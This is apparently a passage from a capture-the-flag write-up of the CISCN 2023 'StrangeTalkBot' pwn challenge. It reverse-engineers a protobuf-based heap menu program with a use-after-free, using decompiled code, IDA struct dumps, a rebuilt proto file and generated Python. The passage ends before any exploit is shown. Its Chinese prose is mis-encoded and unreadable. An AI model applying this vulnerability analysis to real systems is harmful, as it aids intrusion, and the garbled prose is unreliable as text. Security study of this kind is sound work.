message */</span></span><br><span class="line">&#125; ProtobufCType;</span><br></pre></td></tr></table></figure><p>è€Œè¿™é‡Œtypeå€¼çš„å®šä¹‰æ˜¯è¿™æ ·çš„ï¼ŒçŸ¥é“è¿™ä¸ªå¾ˆé‡è¦ï¼Œåœ¨åç»­çš„åšé¢˜ç¯èŠ‚ä¸­éœ€è¦ã€‚</p><p>ç„¶è€Œï¼Œè¿™ç§é¢˜ç›®ä¸€èˆ¬æ¥è¯´éƒ½æ˜¯ç”¨æˆ·æ€çš„é¢˜ç›®ï¼Œè€Œé¢å¯¹ç”¨æˆ·æ€é¢˜ç›®æˆ‘ä»¬å†™çš„è„šæœ¬æ›´å¤šçš„æ˜¯ä½¿ç”¨<code>python</code>å»å†™ï¼Œè¿™é‡ŒåŒæ ·å¯ä»¥ä½¿ç”¨<code>protoc</code>å·¥å…·ç”Ÿæˆ<code>python</code>æ–‡ä»¶å¯ä»¥å¼•å…¥çš„æ–‡ä»¶ã€‚å‘½ä»¤ä¸º:<code>protoc --python_out=. ./test.proto</code></p><h2 id="StrangeTalkBot"><a href="#StrangeTalkBot" class="headerlink" title="StrangeTalkBot"></a>StrangeTalkBot</h2><p>è¿™é“é¢˜æ˜¯ciscn2023çš„ç¬¬äºŒé“pwné¢˜ã€‚</p><h3 id="é¢˜ç›®åˆ†æ"><a href="#é¢˜ç›®åˆ†æ" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall __noreturn <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">ssize_t</span> v3; <span class="comment">// rsi</span></span><br><span class="line">  _QWORD *v4; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  init_io();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;byte_A060, <span class="number">0</span>, <span class="number">0x400</span>uLL);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You can try to have friendly communication with me now: &quot;</span>);</span><br><span class="line">    v3 = read(<span class="number">0</span>, &amp;byte_A060, <span class="number">0x400</span>uLL);</span><br><span class="line">    v4 = (_QWORD *)sub_192D(<span class="number">0LL</span>, v3, &amp;byte_A060);</span><br><span class="line">    <span class="keyword">if</span> ( !v4 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    sub_155D(v4[<span class="number">3</span>], v4[<span class="number">4</span>], v4[<span class="number">5</span>], v4[<span class="number">6</span>], v4[<span class="number">7</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">  errExit(<span class="number">0LL</span>, v3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ï¼Œé¢˜ç›®ä¸»å¹²æ¯”è¾ƒæ¸…æ™°ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *__fastcall <span class="title">sub_155D</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">        __int64 opt,</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="keyword">unsigned</span> __int64 idx,</span></span></span><br><span class="line"><span class="params"><span class="function">        __int64 chunk_size,</span></span></span><br><span class="line"><span class="params"><span class="function">        __int64 content_size,</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="keyword">const</span> <span class="keyword">void</span> *content)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> size; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  size = chunk_size;</span><br><span class="line">  <span class="keyword">if</span> ( idx &gt;= <span class="number">0x21</span> )</span><br><span class="line">    errExit();</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int64)content_size &gt;= <span class="number">0xF1</span> )</span><br><span class="line">    errExit();</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int64)chunk_size &gt;= <span class="number">0xF1</span> )</span><br><span class="line">    errExit();</span><br><span class="line">  <span class="keyword">if</span> ( chunk_size &lt; content_size )</span><br><span class="line">    size = content_size;</span><br><span class="line">  <span class="keyword">if</span> ( opt == <span class="number">4</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">delete</span>(idx);</span><br><span class="line">  <span class="keyword">if</span> ( opt &gt; <span class="number">4</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_19;</span><br><span class="line">  <span class="keyword">if</span> ( opt == <span class="number">3</span> )</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">char</span> *)show(idx);</span><br><span class="line">  <span class="keyword">if</span> ( opt == <span class="number">1</span> )</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">char</span> *)create(idx, size, content_size, content);</span><br><span class="line">  <span class="keyword">if</span> ( opt != <span class="number">2</span> )</span><br><span class="line">LABEL_19:</span><br><span class="line">    errExit();</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">char</span> *)edit(idx, content_size, content);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è€Œåœ¨è¿™ä¸ªå‡½æ•°å†…éƒ¨å…¶å®å°±æ˜¯å¾ˆç»å…¸çš„èœå•ç±»å †é¢˜ï¼Œå¹¶ä¸”é¢˜ç›®ä¸­çš„æ¼æ´ä¹Ÿå¾ˆç®€å•ï¼Œå°±æ˜¯ä¸€ä¸ªå¾ˆå•çº¯çš„UAFã€‚éº»çƒ¦çš„æ˜¯<code>sub_192D</code>å‡½æ•°å†…éƒ¨çš„<code>sub_5090</code>æœ‰å¾ˆé•¿çš„ä»£ç ã€‚è™½ç„¶æˆ‘ä¹Ÿä¸çŸ¥é“æ€ä¹ˆçŒœçš„ï¼Œä½†æ˜¯ä»–å°±æ˜¯<code>protobuf</code>å¯¹åº”çš„<code>unpack</code>å‡½æ•°ã€‚</p><h3 id="ç†è§£é¢˜ç›®ä¸­çš„protobuf"><a href="#ç†è§£é¢˜ç›®ä¸­çš„protobuf" class="headerlink" title="ç†è§£é¢˜ç›®ä¸­çš„protobuf"></a>ç†è§£é¢˜ç›®ä¸­çš„protobuf</h3><p>éœ€è¦ç†è§£çš„è¯ï¼Œé¦–å…ˆå°±æ˜¯éœ€è¦ç¡®å®šé¢˜ç›®ä¸­å„ä¸ªå‡½æ•°çš„å«ä¹‰ä»¥åŠéƒ¨åˆ†å¯èƒ½éœ€è¦çŸ¥é“çš„ç»“æ„ä½“ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_192D</span><span class="params">(__int64 a1, __int64 a2, __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> sub_5090(&amp;unk_9C80, a1, a2, a3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°è¿™ä¸ªå‡½æ•°å†…éƒ¨åªæ˜¯è°ƒç”¨äº†å¦å¤–ä¸€ä¸ªå‡½æ•°ï¼Œå¹¶ä¸”è¿”å›å‡ºå¦å¤–å‡½æ•°çš„è¿”å›å€¼ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *__fastcall <span class="title">sub_5090</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="keyword">const</span> ProtobufCMessageDescriptor *desc,</span></span></span><br><span class="line"><span class="params"><span class="function">        ProtobufCAllocator *a2,</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="keyword">unsigned</span> __int64 count,</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="keyword">unsigned</span> __int8 *content)</span></span></span><br></pre></td></tr></table></figure><p>ç„¶è€Œè¿™ä¸ªå‡½æ•°çš„è¿”å›å€¼æ˜¯ä¸€ä¸ªæŒ‡é’ˆ(å‚æ•°çš„ç±»å‹éƒ½æ˜¯å·²ç»ç»è¿‡äº†æˆ‘çš„ä¿®æ”¹äº†)ã€‚å…¶å®é€šè¿‡å¯¹æ¯”å¯ä»¥å‘ç°ç»“æ„å¾ˆç±»ä¼¼ä¸Šè¿°ä¸­çš„<code>unpack</code>å‡½æ•°ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Test *<span class="title">test__unpack</span><span class="params">(ProtobufCAllocator  *allocator, <span class="keyword">size_t</span> len, <span class="keyword">const</span> <span class="keyword">uint8_t</span> *data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (Test *) protobuf_c_message_unpack (&amp;test__descriptor, allocator, len, data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å½“ç„¶ï¼Œå¯ä»¥é€šè¿‡æœç´¢å…¶å†…éƒ¨çš„å­—ç¬¦ä¸²</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">actionid_str = desc-&gt;fields_sorted_by_name;</span><br><span class="line">canary = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line"><span class="keyword">if</span> ( desc-&gt;magic != <span class="number">0x28AAEEF9</span> )</span><br><span class="line">  __assert_fail(</span><br><span class="line">  <span class="string">&quot;(desc)-&gt;magic == BINARYBF_C__MESSAGE_DESCRIPTOR_MAGIC&quot;</span>,</span><br><span class="line">  <span class="string">&quot;BINARYBF-c/BINARYBF-c.c&quot;</span>,</span><br><span class="line">  <span class="number">0xBF2</span>u,</span><br><span class="line">  <span class="string">&quot;BINARYBF_c_message_unpack&quot;</span>);</span><br></pre></td></tr></table></figure><p>æ¯”å¦‚å‡½æ•°å¼€å¤´çš„assertå³å¯æœç´¢åˆ°å…¶æºç ä½ç½®ã€‚æ‰€ä»¥è¿™ä¸ª1200å¤šè¡Œçš„å‡½æ•°å…¶å®å°±æ˜¯<code>protobuf_c_message_unpack</code>å‡½æ•°ã€‚</p><p>é‚£ä¹ˆå°±å¯ä»¥é€šè¿‡è¿™ä¸ªå‡½æ•°æ‰€ä½¿ç”¨çš„å‚æ•°ï¼Œç›´æ¥åœ¨idaä¸­æ·»åŠ ç»“æ„ä½“è¿›è¡Œè¿›ä¸€æ­¥åˆ†æã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> ProtobufCMessageDescriptor struc ; (<span class="keyword">sizeof</span>=<span class="number">0x78</span>, mappedto_19)</span><br><span class="line"><span class="number">00000000</span> magic dd ?</span><br><span class="line"><span class="number">00000004</span> name dq ?</span><br><span class="line"><span class="number">0000000</span>C short_name dq ?</span><br><span class="line"><span class="number">00000014</span> c_name dq ?</span><br><span class="line"><span class="number">0000001</span>C package_name dq ?</span><br><span class="line"><span class="number">00000024</span> sizeof_message dq ?</span><br><span class="line"><span class="number">0000002</span>C n_fields dd ?</span><br><span class="line"><span class="number">00000030</span> fields dq ?</span><br><span class="line"><span class="number">00000038</span> fields_sorted_by_name dq ?</span><br><span class="line"><span class="number">00000040</span> n_field_ranges dd ?</span><br><span class="line"><span class="number">00000044</span> field_ranges dq ?</span><br><span class="line"><span class="number">0000004</span>C message_init ProtobufCMessage ?</span><br><span class="line"><span class="number">00000060</span> reserved1 dq ?</span><br><span class="line"><span class="number">00000068</span> reserved2 dq ?</span><br><span class="line"><span class="number">00000070</span> reserved3 dq ?</span><br><span class="line"><span class="number">00000078</span> ProtobufCMessageDescriptor ends</span><br><span class="line"><span class="number">00000078</span></span><br><span class="line"><span class="number">00000000</span> ; ---------------------------------------------------------------------------</span><br><span class="line"><span class="number">00000000</span></span><br><span class="line"><span class="number">00000000</span> ProtobufCMessage struc ; (<span class="keyword">sizeof</span>=<span class="number">0x14</span>, mappedto_21)</span><br><span class="line"><span class="number">00000000</span>                                         ; XREF: ProtobufCMessageDescriptor/r</span><br><span class="line"><span class="number">00000000</span> descriptor dq ?</span><br><span class="line"><span class="number">00000008</span> n_unknown_fields dd ?</span><br><span class="line"><span class="number">0000000</span>C unknown_fields dq ?</span><br><span class="line"><span class="number">00000014</span> ProtobufCMessage ends</span><br><span class="line"><span class="number">00000014</span></span><br><span class="line"><span class="number">00000000</span> ; ---------------------------------------------------------------------------</span><br><span class="line"><span class="number">00000000</span></span><br><span class="line"><span class="number">00000000</span> ProtobufCAllocator struc ; (<span class="keyword">sizeof</span>=<span class="number">0x18</span>, mappedto_22)</span><br><span class="line"><span class="number">00000000</span> alloc dq ?</span><br><span class="line"><span class="number">00000008</span> <span class="built_in">free</span> dq ?</span><br><span class="line"><span class="number">00000010</span> allocator_data dq ?</span><br><span class="line"><span class="number">00000018</span> ProtobufCAllocator ends</span><br><span class="line"><span class="number">00000018</span></span><br><span class="line"><span class="number">00000000</span> ; ---------------------------------------------------------------------------</span><br><span class="line"><span class="number">00000000</span></span><br><span class="line"><span class="number">00000000</span> ProtobufCFieldDescriptor struc ; (<span class="keyword">sizeof</span>=<span class="number">0x44</span>, mappedto_23)</span><br><span class="line"><span class="number">00000000</span>                                         ; XREF: .data.rel.ro:stru_9B60/r</span><br><span class="line"><span class="number">00000000</span> name dq ?</span><br><span class="line"><span class="number">00000008</span> id dd ?</span><br><span class="line"><span class="number">0000000</span>C label dd ?</span><br><span class="line"><span class="number">00000010</span> type dd ?</span><br><span class="line"><span class="number">00000014</span> quantifier_offset dd ?</span><br><span class="line"><span class="number">00000018</span> offset dd ?</span><br><span class="line"><span class="number">0000001</span>C descriptor dq ?</span><br><span class="line"><span class="number">00000024</span> default_value dq ?</span><br><span class="line"><span class="number">0000002</span>C flags dd ?</span><br><span class="line"><span class="number">00000030</span> reserved_flags dd ?</span><br><span class="line"><span class="number">00000034</span> reserved2 dq ?</span><br><span class="line"><span class="number">0000003</span>C reserved3 dq ?</span><br><span class="line"><span class="number">00000044</span> ProtobufCFieldDescriptor ends</span><br></pre></td></tr></table></figure><p>åœ¨å‰é¢æˆ‘ä»¬æåˆ°äº†<code>ProtobufCFieldDescriptor</code>ç»“æ„ä½“ï¼Œè¿™ä¸ªç»“æ„ä½“ä¸­å­˜å‚¨ç€ç»“æ„ä½“ä¸­æ‰€æœ‰æˆå‘˜çš„æ•°æ®ç±»å‹ï¼Œå¹¶ä¸”ç¬¬ä¸€ä¸ªæˆå‘˜æ˜¯æŒ‡å‘å…¶åå­—çš„åœ°å€ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥æ ¹æ®å­—ç¬¦ä¸²æ‰¾åˆ°ç»“æ„ä½“ç›¸å°çš„ä½ç½®ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">.data.rel.ro:0000000000009B60 80 70 00 00 00 00 00 00 01 00+stru_9B60 ProtobufCFieldDescriptor &lt;7080h, 1, 0, 4, 0, 18h, 0, 0, 0, 0, 0, 0&gt;</span><br><span class="line">.data.rel.ro:0000000000009B60 00 00 00 00 00 00 04 00 00 00+                                        ; DATA XREF: .data.rel.ro:0000000000009CB8â†“o</span><br><span class="line">.data.rel.ro:0000000000009BA4 00                            db    0</span><br><span class="line">.data.rel.ro:0000000000009BA5 00                            db    0</span><br><span class="line">.data.rel.ro:0000000000009BA6 00                            db    0</span><br><span class="line">.data.rel.ro:0000000000009BA7 00                            db    0</span><br><span class="line">.data.rel.ro:0000000000009BA8                               ; ProtobufCFieldDescriptor</span><br><span class="line">.data.rel.ro:0000000000009BA8 89 70 00 00 00 00 00 00 02 00+ProtobufCFieldDescriptor &lt;7089h, 2, 0, 4, 0, 20h, 0, 0, 0, 0, 0, 0&gt;</span><br><span class="line">.data.rel.ro:0000000000009BEC 00                            db    0</span><br><span class="line">.data.rel.ro:0000000000009BED 00                            db    0</span><br><span class="line">.data.rel.ro:0000000000009BEE 00                            db    0</span><br><span class="line">.data.rel.ro:0000000000009BEF 00                            db    0</span><br><span class="line">.data.rel.ro:0000000000009BF0                               ; ProtobufCFieldDescriptor</span><br><span class="line">.data.rel.ro:0000000000009BF0 90 70 00 00 00 00 00 00 03 00+ProtobufCFieldDescriptor &lt;7090h, 3, 0, 4, 0, 28h, 0, 0, 0, 0, 0, 0&gt;</span><br><span class="line">.data.rel.ro:0000000000009C34 00                            db    0</span><br><span class="line">.data.rel.ro:0000000000009C35 00                            db    0</span><br><span class="line">.data.rel.ro:0000000000009C36 00                            db    0</span><br><span class="line">.data.rel.ro:0000000000009C37 00                            db    0</span><br><span class="line">.data.rel.ro:0000000000009C38                               ; ProtobufCFieldDescriptor</span><br><span class="line">.data.rel.ro:0000000000009C38 98 70 00 00 00 00 00 00 04 00+ProtobufCFieldDescriptor &lt;7098h, 4, 0, 0Fh, 0, 30h, 0, 0, 0, 0, 0, 0&gt;</span><br></pre></td></tr></table></figure><p>æœ€ç»ˆå¯ä»¥å¾—å‡ºï¼Œå‰é¢ä¸‰ä¸ªæˆå‘˜çš„æ•°æ®ç±»å‹ä¸º<code>sint64</code>ï¼Œæœ€åä¸€ä¸ªæˆå‘˜çš„æ•°æ®ç±»å‹ä¸º<code>bytes</code>ï¼Œæ‰€ä»¥å¯ä»¥è‡ªå·±å†™å‡º<code>proto</code>æ–‡ä»¶äº†ã€‚</p><figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">syntax = <span class="string">&quot;proto2&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">message</span> <span class="title">Devicemsg</span></span>&#123;</span><br><span class="line"><span class="keyword">required</span> <span class="built_in">sint64</span> actionid = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">required</span> <span class="built_in">sint64</span> msgidx = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">required</span> <span class="built_in">sint64</span> msgsize = <span class="number">3</span>;</span><br><span class="line"><span class="keyword">required</span> <span class="built_in">bytes</span> msgcontent = <span class="number">4</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åä½¿ç”¨ä¸Šè¿°ä»£ç ç”Ÿæˆ<code>python</code>å¯¹åº”çš„æ–‡ä»¶ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Generated by the protocol buffer compiler.  DO NOT EDIT!</span></span><br><span class="line"><span class="comment"># source: Devicemsg.proto</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">_b=sys.version_info[<span class="number">0</span>]&lt;<span class="number">3</span> <span class="keyword">and</span> (<span class="keyword">lambda</span> x:x) <span class="keyword">or</span> (<span class="keyword">lambda</span> x:x.encode(<span class="string">&#x27;latin1&#x27;</span>))</span><br><span class="line"><span class="keyword">from</span> google.protobuf <span class="keyword">import</span> descriptor <span class="keyword">as</span> _descriptor</span><br><span class="line"><span class="keyword">from</span> google.protobuf <span class="keyword">import</span> message <span class="keyword">as</span> _message</span><br><span class="line"><span class="keyword">from</span> google.protobuf <span class="keyword">import</span> reflection <span class="keyword">as</span> _reflection</span><br><span class="line"><span class="keyword">from</span> google.protobuf <span class="keyword">import</span> symbol_database <span class="keyword">as</span> _symbol_database</span><br><span class="line"><span class="comment"># @@protoc_insertion_point(imports)</span></span><br><span class="line"></span><br><span class="line">_sym_db = _symbol_database.Default()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">DESCRIPTOR = _descriptor.FileDescriptor(</span><br><span class="line">  name=<span class="string">&#x27;Devicemsg.proto&#x27;</span>,</span><br><span class="line">  package=<span class="string">&#x27;&#x27;</span>,</span><br><span class="line">  syntax=<span class="string">&#x27;proto2&#x27;</span>,</span><br><span class="line">  serialized_options=<span class="literal">None</span>,</span><br><span class="line">  serialized_pb=_b(<span class="string">&#x27;\n\x0f\x44\x65vicemsg.proto\&quot;R\n\tDevicemsg\x12\x10\n\x08\x61\x63tionid\x18\x01 \x02(\x12\x12\x0e\n\x06msgidx\x18\x02 \x02(\x12\x12\x0f\n\x07msgsize\x18\x03 \x02(\x12\x12\x12\n\nmsgcontent\x18\x04 \x02(\x0c&#x27;</span>)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">_DEVICEMSG = _descriptor.Descriptor(</span><br><span class="line">  name=<span class="string">&#x27;Devicemsg&#x27;</span>,</span><br><span class="line">  full_name=<span class="string">&#x27;Devicemsg&#x27;</span>,</span><br><span class="line">  filename=<span class="literal">None</span>,</span><br><span class="line">  file=DESCRIPTOR,</span><br><span class="line">  containing_type=<span class="literal">None</span>,</span><br><span class="line">  fields=[</span><br><span class="line">    _descriptor.FieldDescriptor(</span><br><span class="line">      name=<span class="string">&#x27;actionid&#x27;</span>, full_name=<span class="string">&#x27;Devicemsg.actionid&#x27;</span>, index=<span class="number">0</span>,</span><br><span class="line">      number=<span class="number">1</span>, <span class="built_in">type</span>=<span class="number">18</span>, cpp_type=<span class="number">2</span>, label=<span class="number">2</span>,</span><br><span class="line">      has_default_value=<span class="literal">False</span>, default_value=<span class="number">0</span>,</span><br><span class="line">      message_type=<span class="literal">None</span>, enum_type=<span class="literal">None</span>, containing_type=<span class="literal">None</span>,</span><br><span class="line">      is_extension=<span class="literal">False</span>, extension_scope=<span class="literal">None</span>,</span><br><span class="line">      serialized_options=<span class="literal">None</span>, file=DESCRIPTOR),</span><br><span class="line">    _descriptor.FieldDescriptor(</span><br><span class="line">      name=<span class="string">&#x27;msgidx&#x27;</span>, full_name=<span class="string">&#x27;Devicemsg.msgidx&#x27;</span>, index=<span class="number">1</span>,</span><br><span class="line">      number=<span class="number">2</span>, <span class="built_in">type</span>=<span class="number">18</span>, cpp_type=<span class="number">2</span>, label=<span class="number">2</span>,</span><br><span class="line">      has_default_value=<span class="literal">False</span>, default_value=<span class="number">0</span>,</span><br><span class="line">      message_type=<span class="literal">None</span>, enum_type=<span class="literal">None</span>, containing_type=<span class="literal">None</span>,</span><br><span class="line">      is_extension=<span class="literal">False</span>, extension_scope=<span class="literal">None</span>,</span><br><span class="line">      serialized_options=<span class="literal">None</span>, file=DESCRIPTOR),</span><br><span class="line">    _descriptor.FieldDescriptor(</span><br><span class="line">      name=<span class="string">&#x27;msgsize&#x27;</span>, full_name=<span class="string">&#x27;Devicemsg.msgsize&#x27;</span>, index=<span class="number">2</span>,</span><br><span class="line">      number=<span class="number">3</span>, <span class="built_in">type</span>=<span class="number">18</span>, cpp_type=<span class="number">2</span>, label=<span class="number">2</span>,</span><br><span class="line">      has_default_value=<span class="literal">False</span>, default_value=<span class="number">0</span>,</span><br><span class="line">      message_type=<span class="literal">None</span>, enum_type=<span class="literal">None</span>, containing_type=<span class="literal">None</span>,</span><br><span class="line">      is_extension=<span class="literal">False</span>, extension_scope=<span class="literal">None</span>,</span><br><span class="line">      serialized_options=<span class="literal">None</span>, file=DESCRIPTOR),</span><br><span class="line">    _descriptor.FieldDescriptor(</span><br><span class="line">      name=<span class="string">&#x27;msgcontent&#x27;</span>, full_name=<span class="string">&#x27;Devicemsg.msgcontent&#x27;</span>, index=<span class="number">3</span>,</span><br><span class="line">      number=<span class="number">4</span>, <span class="built_in">type</span>=<span class="number">12</span>, cpp_type=<span class="number">9</span>, label=<span class="number">2</span>,</span><br><span class="line">      has_default_value=<span class="literal">False</span>, default_value=_b(<span class="string">&quot;&quot;</span>),</span><br><span class="line">      message_type=<span class="literal">None</span>, enum_type=<span class="literal">None</span>, containing_type=<span class="literal">None</span>,</span><br><span class="line">      is_extension=<span class="literal">False</span>, extension_scope=<span class="literal">None</span>,</span><br><span class="line">      serialized_options=<span class="literal">None</span>, file=DESCRIPTOR),</span><br><span class="line">  ],</span><br><span class="line">  extensions=[</span><br><span class="line">  ],</span><br><span class="line">  nested_types=[],</span><br><span class="line">  enum_types=[</span><br><span class="line">  ],</span><br><span class="line">  serialized_options=<span class="literal">None</span>,</span><br><span class="line">  is_extendable=<span class="literal">False</span>,</span><br><span class="line">  syntax=<span class="string">&#x27;proto2&#x27;</span>,</span><br><span class="line">  